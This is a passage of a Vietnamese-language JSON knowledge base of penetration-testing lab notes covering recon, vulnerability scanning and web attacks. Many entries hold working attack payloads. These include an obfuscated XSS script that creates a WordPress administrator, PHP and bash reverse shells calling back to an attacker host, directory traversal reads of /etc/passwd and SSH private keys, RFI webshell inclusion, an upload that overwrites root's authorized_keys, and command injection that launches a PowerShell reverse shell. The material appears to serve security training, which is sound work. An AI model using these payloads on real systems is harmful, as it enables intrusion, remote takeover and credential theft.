    "content": "Sử dụng Nmap để quét cổng, dịch vụ, phiên bản, và HĐH. Hỗ trợ nhiều kiểu quét (-sS: TCP SYN, -sT: TCP Connect, -sU: UDP). Các tùy chọn quan trọng: -sV (Version Detection), -sC (Default Script), -O (OS Detection), -A (Advanced), -p (Port Range). Trên Windows có thể dùng `Test-NetConnection` hoặc script PowerShell để thay thế.",
    "tags": [
      "active",
      "port_scan",
      "recon",
      "nmap",
      "tcp",
      "udp",
      "os_detection",
      "service_detection",
      "windows",
      "linux",
      "Test-NetConnection",
      "powershell"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "nmap -sS -p- -T4 -Pn -vvv -oN nmap.txt <target_ip>"
      },
      {
        "language": "powershell",
        "command": "Test-NetConnection -Port 445 <target_ip>"
      },
      {
        "language": "powershell",
        "command": "1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"<target_ip>\", $_)) \"TCP port $_ is open\"} 2>$null"
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "active_smb_enum",
    "category": "Information Gathering",
    "title": "Active: SMB Enumeration",
    "content": "Thu thập thông tin từ dịch vụ SMB. Sử dụng Nmap (với script smb), `nbtscan` (quét NetBIOS), `enum4linux` (liệt kê shares, users, groups) trên Kali, hoặc `net view` trên Windows.",
    "tags": [
      "active",
      "smb",
      "enumeration",
      "recon",
      "nmap",
      "nbtscan",
      "enum4linux",
      "net_view",
      "windows",
      "linux"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo nbtscan -r <target_ip>/24"
      },
      {
        "language": "powershell",
        "command": "net view \\\\<target_ip_or_hostname> /all"
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "active_smtp_enum",
    "category": "Information Gathering",
    "title": "Active: SMTP Enumeration",
    "content": "Kết nối đến máy chủ SMTP (cổng 25) để thu thập thông tin. Sử dụng `nc` hoặc `telnet` trên Kali, hoặc `Test-NetConnection` / `telnet` trên Windows.",
    "tags": [
      "active",
      "smtp",
      "enumeration",
      "recon",
      "nc",
      "telnet",
      "Test-NetConnection",
      "port_25"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "nc -nv <target_ip> 25"
      },
      {
        "language": "powershell",
        "command": "Test-NetConnection -Port 25 <target_ip>"
      },
      {
        "language": "bash",
        "command": "telnet <target_ip> 25"
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
  {
    "id": "active_snmp_enum",
    "category": "Information Gathering",
    "title": "Active: SNMP Enumeration",
    "content": "Thu thập thông tin từ các thiết bị mạng thông qua giao thức SNMP. Sử dụng `snmpwalk` hoặc `onesixtyone` trên Kali. Có thể truy vấn các giá trị MIB (Management Information Base) cụ thể để lấy thông tin về System Processes, Running Programs, User Accounts, TCP Local Ports, v.v.",
    "tags": [
      "active",
      "snmp",
      "enumeration",
      "recon",
      "snmpwalk",
      "onesixtyone",
      "mib",
      "network_device"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "snmpwalk -c public -v1 <target_ip>"
      },
      {
        "language": "bash",
        "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.1"
      },
      {
        "language": "bash",
        "command": "onesixtyone -c test.txt -i <listIP>"
      },
      {
        "language": "text",
        "command": "MIB 1.3.6.1.4.1.77.1.2.25: User Accounts"
      },
      {
        "language": "text",
        "command": "MIB 1.3.6.1.2.1.25.4.2.1.2: Running Programs"
      }
    ],
    "related_cves": [],
    "source_file": "1-Information Gathering.md"
  },
   {
    "id": "vuln_scanning_theory",
    "category": "Vulnerability Scanning",
    "title": "Theory: How Vulnerability Scanning Works",
    "content": "Vulnerability Scanning là quá trình xác định bề mặt tấn công (attack surface) của một phần mềm, hệ thống hoặc mạng. Quy trình cơ bản của một máy quét tự động bao gồm: khám phá máy chủ (Host discovery), quét cổng (Port scanning), phát hiện hệ điều hành, dịch vụ và phiên bản, sau đó so khớp kết quả với cơ sở dữ liệu lỗ hổng.",
    "tags": [
      "theory",
      "vulnerability_scanning",
      "process",
      "host_discovery",
      "port_scanning",
      "version_detection"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "2-Vulnerability Scanning.md"
  },
  {
    "id": "vuln_scanning_types",
    "category": "Vulnerability Scanning",
    "title": "Theory: Types of vulnerability scanners",
    "content": "Có hai loại máy quét lỗ hổng chính: máy quét bên ngoài (external) và bên trong (internal); máy quét đã xác thực (authenticated) và chưa xác thực (unauthenticated).",
    "tags": [
      "theory",
      "vulnerability_scanning",
      "types",
      "external",
      "internal",
      "authenticated",
      "unauthenticated"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "2-Vulnerability Scanning.md"
  },
  {
    "id": "nessus_install",
    "category": "Vulnerability Scanning",
    "title": "Vulnerability Scanning with Nessus: Install Nessus",
    "content": "Tải xuống Nessus Essentials từ Tenable. Cài đặt trên Debian/Ubuntu bằng `sudo apt install`. Khởi động dịch vụ bằng `sudo systemctl start nessusd.service`. Truy cập giao diện web tại http://localhost:8834 để đăng ký và đăng nhập.",
    "tags": [
      "tool",
      "nessus",
      "install",
      "setup",
      "vulnerability_scanning",
      "linux",
      "debian"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo apt install ./nessus-8.14.1-debian11_amd64.deb"
      },
      {
        "language": "bash",
        "command": "sudo systemctl start nessusd.service"
      },
      {
        "language": "text",
        "command": "http://localhost:8834"
      }
    ],
    "related_cves": [],
    "source_file": "2-Vulnerability Scanning.md"
  },
  {
    "id": "nessus_scan_types",
    "category": "Vulnerability Scanning",
    "title": "Vulnerability Scanning with Nessus: Scan Types",
    "content": "Nessus cung cấp nhiều loại quét khác nhau, bao gồm Scan Basic, Scan with Authenticated (quét đã xác thực), và Scan Advanced Dynamic.",
    "tags": [
      "tool",
      "nessus",
      "scan_types",
      "authenticated",
      "basic_scan",
      "vulnerability_scanning"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "2-Vulnerability Scanning.md"
  },
  {
    "id": "nmap_nse_scan",
    "category": "Vulnerability Scanning",
    "title": "Vulnerability Scanning with Nmap: Scan with NSE scripts",
    "content": "Sử dụng Nmap Scripting Engine (NSE) để quét lỗ hổng. Có thể dùng tham số `--script \"vuln\"` để chạy tất cả các script trong danh mục 'vuln' nhằm phát hiện lỗ hổng.",
    "tags": [
      "tool",
      "nmap",
      "nse",
      "vulnerability_scanning",
      "scripts",
      "vuln"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "nmap -sV -p 443 --script \"vuln\" <target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "2-Vulnerability Scanning.md"
  },
  {
    "id": "nmap_nse_custom_scripts",
    "category": "Vulnerability Scanning",
    "title": "Vulnerability Scanning with Nmap: Working with Nmap Scripts",
    "content": "Có thể tải xuống các script NSE tùy chỉnh cho các CVE cụ thể từ nmap.org hoặc Github. Sao chép script vào `/usr/share/nmap/scripts` và chạy `nmap --script-updatedb` để cập nhật cơ sở dữ liệu script. Sau đó, gọi script cụ thể trong lệnh quét.",
    "tags": [
      "tool",
      "nmap",
      "nse",
      "vulnerability_scanning",
      "scripts",
      "custom_script",
      "cve"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "nmap --script-updatedb"
      },
      {
        "language": "bash",
        "command": "nmap -sV -p 443 --script \"vuln and http-vuln-cve2017-1001000\" <target_ip>"
      }
    ],
    "related_cves": [
      "CVE-2017-1001000"
    ],
    "source_file": "2-Vulnerability Scanning.md"
  },
  {
    "id": "webapp_tool_nmap",
    "category": "WebApp Attacks",
    "title": "Web Application Security Testing Tools: Nmap",
    "content": "Sử dụng Nmap để quét cổng 80, phát hiện phiên bản dịch vụ (-sV) và chạy script http-enum.",
    "tags": [
      "tool",
      "nmap",
      "web",
      "recon",
      "http-enum",
      "port_80"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "sudo nmap -p80  -sV <target_ip>"
      },
      {
        "language": "bash",
        "command": "sudo nmap -p80 --script=http-enum <target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "3-Introduction of WebApp Attacks.md"
  },
  {
    "id": "webapp_tool_wappalyzer",
    "category": "WebApp Attacks",
    "title": "Web Application Security Testing Tools: Wappalyzer",
    "content": "Wappalyzer là một công cụ để xác định các công nghệ được sử dụng trên trang web.",
    "tags": [
      "tool",
      "wappalyzer",
      "web",
      "recon",
      "technology_detection"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "3-Introduction of WebApp Attacks.md"
  },
  {
    "id": "webapp_tool_gobuster",
    "category": "WebApp Attacks",
    "title": "Web Application Security Testing Tools: Gobuster",
    "content": "Sử dụng Gobuster với chế độ 'dir' để brute-force các thư mục và tệp trên máy chủ web bằng cách sử dụng một wordlist.",
    "tags": [
      "tool",
      "gobuster",
      "web",
      "recon",
      "bruteforce",
      "directory_discovery"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
      }
    ],
    "related_cves": [],
    "source_file": "3-Introduction of WebApp Attacks.md"
  },
  {
    "id": "webapp_tool_burpsuite",
    "category": "WebApp Attacks",
    "title": "Web Application Security Testing Tools: Burp Suite",
    "content": "Burp Suite là một công cụ proxy để chặn và sửa đổi lưu lượng web, hữu ích cho việc kiểm thử bảo mật ứng dụng web.",
    "tags": [
      "tool",
      "burpsuite",
      "web",
      "proxy",
      "interception"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "3-Introduction of WebApp Attacks.md"
  },
  {
    "id": "webapp_enum_devtools",
    "category": "WebApp Attacks",
    "title": "Web Application Enumeration: Development Tools",
    "content": "Sử dụng các công cụ phát triển (Development Tools) và công cụ mạng (Network Tools) trên trình duyệt để xem các tệp html, js, css...",
    "tags": [
      "web",
      "enumeration",
      "recon",
      "devtools",
      "browser"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "3-Introduction of WebApp Attacks.md"
  },
  {
    "id": "webapp_enum_gobuster_api",
    "category": "WebApp Attacks",
    "title": "Web Application Enumeration: Gobuster (API)",
    "content": "Sử dụng Gobuster để liệt kê các đường dẫn (path) liên quan đến API, cũng như các tệp phổ biến như robot.txt, sitemap.xml. Có thể sử dụng pattern (-p) để tìm các phiên bản API (ví dụ: /v1, /v2).",
    "tags": [
      "web",
      "enumeration",
      "recon",
      "gobuster",
      "api",
      "robot.txt",
      "sitemap.xml",
      "pattern"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -p patern"
      },
      {
        "language": "text",
        "command": "{GOBUSTER}/v1 \n            {GOBUSTER}/v2"
      }
    ],
    "related_cves": [],
    "source_file": "3-Introduction of WebApp Attacks.md"
  },
  {
    "id": "xss_theory",
    "category": "WebApp Attacks",
    "title": "Cross-Site Scripting (XSS) Theory",
    "content": "Cross-Site Scripting (XSS) là một lỗ hổng cho phép kẻ tấn công chèn các script phía máy khách (như JavaScript) vào các trang web mà người dùng khác xem, khai thác lòng tin của người dùng vào trang web.",
    "tags": [
      "theory",
      "xss",
      "cross_site_scripting",
      "web",
      "vulnerability",
      "javascript"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "3-Introduction of WebApp Attacks.md"
  },
  {
    "id": "xss_lab_wordpress_rce",
    "category": "WebApp Attacks",
    "title": "LAB XSS: WordPress Admin User Creation to RCE",
    "content": "Một bài lab XSS khai thác lỗ hổng trên WordPress. Payload JavaScript được chèn (qua User-Agent, sử dụng Burp Suite) để tự động tạo một người dùng 'attacker' mới với vai trò quản trị viên (administrator). Sau đó, đăng nhập bằng tài khoản 'attacker', tải lên plugin webshell, và sử dụng webshell để tải lên tệp RCE.php (reverse shell) và thực thi nó để có được Remote Code Execution (RCE).",
    "tags": [
      "lab",
      "xss",
      "javascript",
      "wordpress",
      "rce",
      "reverse_shell",
      "burpsuite",
      "user_agent",
      "plugin",
      "webshell",
      "admin_creation"
    ],
    "code_snippets": [
      {
        "language": "javascript",
        "command": "    var ajaxRequest = new XMLHttpRequest();\\n    var requestURL = \"/wp-admin/user-new.php\";\\n    var nonceRegex = /ser\\\" value=\\\"([^\\\"]*?)\\\"/g;\\n    ajaxRequest.open(\"GET\", requestURL, false);\\n    ajaxRequest.send();\\n    var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);\\n    var nonce = nonceMatch[1];\\n    var params = \"action=createuser&_wpnonce_create-user=\" + nonce + \"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator\";\\n    ajaxRequest = new XMLHttpRequest();\\n    ajaxRequest.open(\"POST\", requestURL, true);\\n    ajaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\\n    ajaxRequest.send(params);"
      },
      {
        "language": "http",
        "command": "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>"
      },
      {
        "language": "php",
        "command": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/<kali_ip>/4444 0>&1'\");?>"
      },
      {
        "language": "bash",
        "command": "nc -lvnp 4444"
      },
      {
        "language": "http",
        "command": "http://<target_domain>/wp-admin/RCE.php"
      }
    ],
    "related_cves": [],
    "source_file": "3-Introduction of WebApp Attacks.md"
  },
  {
    "id": "dir_traversal_lab_linux",
    "category": "Common WebApp Attack",
    "title": "Basic Directory Traversal: LAB Linux",
    "content": "Khai thác lỗ hổng Directory Traversal trên Linux. Sử dụng `curl` để đọc tệp `/etc/passwd` và sau đó đọc tệp private key `id_rsa` của người dùng 'offsec'. Dùng private key để SSH vào máy chủ.",
    "tags": [
      "lab",
      "directory_traversal",
      "linux",
      "curl",
      "etc_passwd",
      "id_rsa",
      "ssh"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl http://<target_domain>/meteor/index.php?page=../../../../../../../../../etc/passwd"
      },
      {
        "language": "bash",
        "command": "curl http://<target_domain>/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa"
      },
      {
        "language": "bash",
        "command": "chmod 400 dt_key"
      },
      {
        "language": "bash",
        "command": "ssh -i dt_key -p 2222 offsec@<target_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "dir_traversal_lab_windows",
    "category": "Common WebApp Attack",
    "title": "Basic Directory Traversal: LAB Windows",
    "content": "Khai thác lỗ hổng Directory Traversal trên Windows. Sử dụng `curl` với cờ `--path-as-is` để đọc tệp `install.txt`.",
    "tags": [
      "lab",
      "directory_traversal",
      "windows",
      "curl",
      "path_as_is"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl --path-as-is \"http://<target_ip>:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt\""
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "dir_traversal_encoding_lab1_linux",
    "category": "Common WebApp Attack",
    "title": "Encoding Special Character Directory Traversal: LAB 1 Linux (Apache 2.4.49)",
    "content": "Khai thác lỗ hổng directory traversal trong Apache 2.4.49 bằng cách sử dụng ký tự mã hóa URL `%2e` cho dấu chấm (.).",
    "tags": [
      "lab",
      "directory_traversal",
      "linux",
      "curl",
      "encoding",
      "url_encoding",
      "%2e",
      "apache"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl http://<target_ip>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "dir_traversal_encoding_lab2_linux",
    "category": "Common WebApp Attack",
    "title": "Encoding Special Character Directory Traversal: LAB 2 Linux",
    "content": "Sử dụng `curl` với `--path-as-is` và ký tự mã hóa URL `%2e` để khai thác lỗ hổng directory traversal.",
    "tags": [
      "lab",
      "directory_traversal",
      "linux",
      "curl",
      "encoding",
      "url_encoding",
      "%2e",
      "path_as_is"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl --path-as-is \"http://<target_ip>:3000/public/plugins/alertmanager/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/install.txt\""
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "lfi_theory",
    "category": "Common WebApp Attack",
    "title": "Local File Inclusion (LFI) Theory",
    "content": "Local File Inclusion (LFI) là một lỗ hổng cho phép kẻ tấn công bao gồm các tệp từ máy chủ đang chạy ứng dụng. Khác với Directory Traversal, LFI có thể cho phép thực thi tệp (ví dụ: webshell, reverse shell).",
    "tags": [
      "theory",
      "lfi",
      "local_file_inclusion",
      "web",
      "vulnerability",
      "webshell",
      "reverse_shell"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "lfi_log_poisoning_lab1_linux",
    "category": "Common WebApp Attack",
    "title": "LFI - LAB 1 Linux (Log Poisoning)",
    "content": "Sử dụng Burp Suite để chặn request. Thay đổi tham số 'page' thành ../../../../../../../../../var/log/apache2/access.log để sử dụng Log Poisoning. Chèn PHP webshell vào User-Agent để thực thi lệnh (cmd=ls). Sau đó, thay đổi `cmd` thành payload reverse shell (bash -i) để lấy reverse shell.",
    "tags": [
      "lab",
      "lfi",
      "log_poisoning",
      "linux",
      "burpsuite",
      "apache",
      "access_log",
      "webshell",
      "php",
      "reverse_shell",
      "user_agent"
    ],
    "code_snippets": [
      {
        "language": "http",
        "command": "page=../../../../../../../../../var/log/apache2/access.log"
      },
      {
        "language": "bash",
        "command": "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali_ip>%2F4444%200%3E%261%22"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "lfi_lab2_linux",
    "category": "Common WebApp Attack",
    "title": "LFI - LAB 2 Linux (Read file)",
    "content": "Sử dụng `curl` để khai thác LFI, đọc tệp `admin.bak.php`.",
    "tags": [
      "lab",
      "lfi",
      "linux",
      "curl",
      "file_read"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl http://<target_domain>/meteor/index.php?page=../../../../../../../../opt/admin.bak.php"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "lfi_log_poisoning_lab3_windows",
    "category": "Common WebApp Attack",
    "title": "LFI - LAB 3 Windows (Log Poisoning)",
    "content": "Sử dụng Burp Suite để chặn request. Thay đổi tham số 'page' thành ../../../../../../../../../xampp/apache/logs để sử dụng Log Poisoning trên XAMPP. Chèn PHP webshell vào User-Agent để thực thi lệnh (cmd=dir). Sau đó, thay đổi `cmd` để đọc tệp flag.",
    "tags": [
      "lab",
      "lfi",
      "log_poisoning",
      "windows",
      "burpsuite",
      "xampp",
      "apache",
      "access_log",
      "webshell",
      "php",
      "user_agent"
    ],
    "code_snippets": [
      {
        "language": "http",
        "command": "page=../../../../../../../../../xampp/apache/logs"
      },
      {
        "language": "http",
        "command": "cmd=more%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "lfi_php_wrappers_theory",
    "category": "Common WebApp Attack",
    "title": "LFI - PHP Wrappers (Theory)",
    "content": "PHP Wrappers là một cách để bao gồm các tệp, có thể khai thác LFI. Chỉ hoạt động khi `allow_url_include` được bật trong cấu hình PHP. Các wrapper phổ biến: `php://filter`, `data:text/plain`, `data://text/plain;base64`.",
    "tags": [
      "theory",
      "lfi",
      "php",
      "php_wrappers",
      "allow_url_include",
      "php_filter",
      "data_wrapper"
    ],
    "code_snippets": [
      {
        "language": "http",
        "command": "php://filter=resource=file.php"
      },
      {
        "language": "http",
        "command": "data:text/plain,<input php>"
      },
      {
        "language": "http",
        "command": "data://text/plain;base64,<base64 encoded php>"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "lfi_php_wrappers_lab1_linux",
    "category": "Common WebApp Attack",
    "title": "LFI - PHP Wrappers LAB 1 Linux (php://filter)",
    "content": "Sử dụng `php://filter` để đọc tệp `backup.php`. Có thể dùng `convert.base64-encode` để mã hóa base64 nội dung tệp, sau đó giải mã bằng `base64 -d`.",
    "tags": [
      "lab",
      "lfi",
      "php",
      "php_wrappers",
      "php_filter",
      "linux",
      "curl",
      "base64"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl http://<target_domain>/meteor/index.php?page=php://filter/resource=../../../../var/www/html/backup.php"
      },
      {
        "language": "bash",
        "command": "curl http://<target_domain>/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/backup.php"
      },
      {
        "language": "bash",
        "command": "echo \"base64 encoded php file\" | base64 -d"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "lfi_php_wrappers_lab2_linux",
    "category": "Common WebApp Attack",
    "title": "LFI - PHP Wrappers LAB 2 Linux (data:// wrapper)",
    "content": "Sử dụng `data://text/plain` wrapper để thực thi mã PHP tùy ý, ví dụ `system('uname -a')`, để lấy thông tin máy chủ.",
    "tags": [
      "lab",
      "lfi",
      "php",
      "php_wrappers",
      "data_wrapper",
      "linux",
      "curl",
      "rce"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "curl \"http://<target_domain>/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>\""
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "rfi_theory",
    "category": "Common WebApp Attack",
    "title": "Remote File Inclusion (RFI) Theory",
    "content": "Remote File Inclusion (RFI) là một lỗ hổng cho phép kẻ tấn công bao gồm các tệp từ một máy chủ từ xa. Chỉ hoạt động khi `allow_url_include` được bật trong cấu hình PHP.",
    "tags": [
      "theory",
      "rfi",
      "remote_file_inclusion",
      "web",
      "vulnerability",
      "php",
      "allow_url_include"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "rfi_lab1_linux",
    "category": "Common WebApp Attack",
    "title": "RFI - LAB 1 Linux (Webshell)",
    "content": "Tạo một máy chủ web đơn giản bằng Python (`python3 -m http.server 8000`) để host một webshell (simple-backdoor.php). Khai thác RFI bằng `curl` để bao gồm webshell từ xa và thực thi lệnh (đọc tệp authorized_keys).",
    "tags": [
      "lab",
      "rfi",
      "linux",
      "php",
      "webshell",
      "curl",
      "python_http_server"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "python3 -m http.server 8000"
      },
      {
        "language": "bash",
        "command": "curl http://<target_domain>/meteor/index.php?page=http://<kali_ip>/simple-backdoor.php?cmd=cat%20/home/elaine/.ssh/authorzied_keys"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "rfi_lab2_linux",
    "category": "Common WebApp Attack",
    "title": "RFI - LAB 2 Linux (Reverse Shell)",
    "content": "Tạo một máy chủ web Python để host tệp `reverse-shell.php`. Mở một trình nghe `nc` trên máy tấn công. Khai thác RFI bằng `curl` để bao gồm tệp reverse shell từ xa, nhận được một reverse shell.",
    "tags": [
      "lab",
      "rfi",
      "linux",
      "php",
      "reverse_shell",
      "curl",
      "python_http_server",
      "nc"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "python3 -m http.server 8000"
      },
      {
        "language": "bash",
        "command": "nc -lvnp 4444"
      },
      {
        "language": "bash",
        "command": "curl http://<target_domain>/meteor/index.php?page=http://<kali_ip>/reverse-shell.php"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "file_upload_executable",
    "category": "Common WebApp Attack",
    "title": "File Upload Vulnerability: Using Executable Files",
    "content": "Khai thác lỗ hổng tải lên tệp để tải lên các tệp thực thi như webshell, reverse shell. Để vượt qua bộ lọc phần mở rộng, hãy thử các biến thể như .php3, .php4, .php5, .php7, hoặc viết hoa/thường lẫn lộn.",
    "tags": [
      "theory",
      "file_upload",
      "vulnerability",
      "webshell",
      "reverse_shell",
      "php",
      "bypass_filter",
      "extension"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "file_upload_non_executable_lab1_linux",
    "category": "Common WebApp Attack",
    "title": "File Upload Vulnerability: Using Non-Executable Files (LAB 1 Linux)",
    "content": "Kịch bản này yêu cầu kết hợp lỗ hổng tải lên tệp với một lỗ hổng khác như Directory Traversal. Sử dụng Burp Suite để chặn yêu cầu tải lên. Tạo một cặp khóa SSH (`ssh-keygen`). Sửa đổi yêu cầu tải lên: thay đổi `filename` thành `../../../../../../../../../root/.ssh/authorized_keys` và `Content-Type` thành `application/octet-stream`. Dán nội dung public key vào phần thân yêu cầu. Điều này ghi đè tệp `authorized_keys` của root, cho phép đăng nhập SSH với tư cách root bằng private key.",
    "tags": [
      "lab",
      "file_upload",
      "directory_traversal",
      "linux",
      "burpsuite",
      "ssh",
      "ssh_keys",
      "authorized_keys",
      "root_access"
    ],
    "code_snippets": [
      {
        "language": "bash",
        "command": "ssh-keygen"
      },
      {
        "language": "http",
        "command": "filename: ../../../../../../../../../root/.ssh/authorized_keys"
      },
      {
        "language": "bash",
        "command": "ssh -p 2222 -i filessh root@<target_domain>"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "command_injection_theory",
    "category": "Common WebApp Attack",
    "title": "Command Injection Vulnerability (Theory)",
    "content": "Command Injection là một lỗ hổng cho phép kẻ tấn công thực thi các lệnh tùy ý trên máy chủ đang chạy ứng dụng.",
    "tags": [
      "theory",
      "command_injection",
      "rce",
      "web",
      "vulnerability"
    ],
    "code_snippets": [],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "command_injection_lab1_windows",
    "category": "Common WebApp Attack",
    "title": "Command Injection - LAB 1 Windows (PowerShell)",
    "content": "Sử dụng Burp Suite để chặn request đến API /archive. Thử nghiệm tham số 'archive' bằng cách chèn lệnh: `git version; ipconfig` (sau khi mã hóa) để xác nhận lỗ hổng và HĐH là Windows. Phát hiện ra rằng PowerShell đang được sử dụng. Thực thi một payload reverse shell PowerShell đã mã hóa base64 (-e) để có được reverse shell.",
    "tags": [
      "lab",
      "command_injection",
      "windows",
      "burpsuite",
      "api",
      "powershell",
      "reverse_shell",
      "base64",
      "encoding"
    ],
    "code_snippets": [
      {
        "language": "text",
        "command": "git version; ipconfig"
      },
      {
        "language": "text",
        "command": "git version; (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell"
      },
      {
        "language": "powershell",
        "command": "powershell -e <base64_encoded_reverse_shell_to_kali_ip>"
      }
    ],
    "related_cves": [],
    "source_file": "4-Common WebApp Attack.md"
  },
  {
    "id": "command_injection_lab2_linux",
    "category": "Common WebApp Attack",
    "title": "Command Injection - LAB 2 Linux (Bash)",
    "content": "Sử dụng Burp Suite để chặn request đến API /archive. Thử nghiệm tham số 'archive' với `ls` để xác nhận HĐH là Linux. Chèn một payload reverse shell `bash -i` (đã mã hóa) để có được reverse shell. Sử dụng `sudo su` để leo thang đặc quyền.",
    "tags": [
      "lab",
      "command_injection",
      "linux",
      "burpsuite",
      "api",
      "bash",
      "reverse_shell",
      "sudo_su",
      "privesc"
    ],
    "code_snippets": [
      {
